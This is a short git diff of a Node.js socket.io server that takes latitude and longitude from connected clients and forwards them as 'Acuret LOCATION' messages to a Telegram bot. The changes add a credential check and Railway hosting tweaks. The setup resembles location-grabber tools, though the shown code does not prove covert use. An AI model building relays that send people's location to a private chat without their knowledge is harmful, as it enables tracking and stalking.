@@ -9,8 +9,8 @@ const https = require('https');
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-
 function sendTelegram(message) {
+    if (!BOT_TOKEN || !CHAT_ID) return; // Safety check
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
     https.get(url, (res) => {}).on('error', (e) => { });
 }
@@ -26,16 +26,15 @@ io.on('connection', (socket) => {
         const formattedLat = Math.abs(data.lat).toFixed(3);
         const formattedLng = Math.abs(data.lng).toFixed(3);
         
-=
         const telegramMsg = `<b>Acuret LOCATION: ${formattedLat}°${latRef} ${formattedLng}°${lngRef}</b>`;
         sendTelegram(telegramMsg);
     });
 });
 
 const PORT = process.env.PORT || 3000;
-http.listen(PORT, () => {
-
+// Railway hamesha 0.0.0.0 par listen karne ko kehta hai
+http.listen(PORT, '0.0.0.0', () => {
     sendTelegram("<b>Acuret•LOCATION\"🌍\"</b>");
-    
-    process.stdout.write('\x1Bc'); 
+    // Railway logs ke liye clear screen hata diya hai taaki crash na ho
+    console.log(`Server active on port ${PORT}`); 
 });
